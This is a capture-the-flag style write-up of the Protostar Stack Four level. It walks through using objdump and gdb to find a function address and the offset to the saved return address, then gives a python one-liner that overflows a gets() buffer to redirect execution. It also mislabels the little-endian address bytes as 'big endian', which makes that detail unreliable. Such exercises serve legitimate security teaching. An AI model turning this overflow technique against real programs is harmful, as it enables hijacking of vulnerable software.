# Stack Four

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

**Hints**

- A variety of introductory papers into buffer overflows may help.
- gdb lets you do "run < input"
- EIP is not directly after the end of buffer, compiler padding can also increase the size.

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Writeup

In this code we have only the buffer and we need to call the **win()** function by overriding the **return address** pointed by **EIP**.

First of all we need to discover the address of the **win()** function and convert it in **big endian**:

```bash
objdump -d /opt/protostar/bin/stack4
```

This is the win() function:

```
080483f4 <win>:
 80483f4:	55                   	push   %ebp
 80483f5:	89 e5                	mov    %esp,%ebp
 80483f7:	83 ec 18             	sub    $0x18,%esp
 80483fa:	c7 04 24 e0 84 04 08 	movl   $0x80484e0,(%esp)
 8048401:	e8 26 ff ff ff       	call   804832c <puts@plt>
 8048406:	c9                   	leave  
 8048407:	c3                   	ret  
```

The address in **big endian** will be:

```
\xf4\x83\x04\x08
```

Now we need to find how much of **words** there are between the **buffer** and the **EIP**. We can find it with **gdb**:

```bash
gdb /opt/protostar/bin/stack4
```

Use the **start** command:

```
start
```

To make first instruction of the binary including calling the first instruction of **main**.

Now the **return address** is written in the stack and we can find it using the register **EBP** and add a single word. (ebp + 1):

```
p $ebp+4
```

With this output:

```
(gdb) p $ebp+4
$1 = (void *) 0xbffffcbc
```

To find the address of the **buffer** we can set a breakpoint in te instruction before calling the **gets**.

To find the address of the code which make the breakpoint we can disassembly the main function, as this:

```
disass main
```

With this output:

```
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   %ebp
0x08048409 <main+1>:	mov    %esp,%ebp
0x0804840b <main+3>:	and    $0xfffffff0,%esp
0x0804840e <main+6>:	sub    $0x50,%esp
0x08048411 <main+9>:	lea    0x10(%esp),%eax
0x08048415 <main+13>:	mov    %eax,(%esp)
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave  
0x0804841e <main+22>:	ret    
End of assembler dump.
```

Now set the breakpoint:

```
b *0x08048418
```

And send the **continue** command (alias **c**):

```
c
```

The address of buffer is now stored in **EAX** register, we can find it with the command:

```
info registers
```

With this output:

```
(gdb) info registers
eax            0xbffffc70	-1073742736
ecx            0xf356b2ab	-212421973
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc60	0xbffffc60
ebp            0xbffffcb8	0xbffffcb8
esi            0x0	0
edi            0x0	0
eip            0x8048418	0x8048418 <main+16>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

We are now able to discover the number of word between the **buffer** and the **EIP**:

```
0xbffffcbc - 0xbffffc70 = 4C = 76
```

The buffer size is 64, we can subtract 64:

```
76 - 64 = 12
```

Divide the number by 4 and obtain the number of words:

```
12 / 4 = 3 
```

Need to write 3 word of junk.

The exploit will be:

```bash
python -c "print('a' * 64 + 'bbbb' * 3 + '\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4
```

With this output:

```bash
$ python -c "print('a' * 64 + 'bbbb' * 3 + '\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4
code flow successfully changed
Segmentation fault
```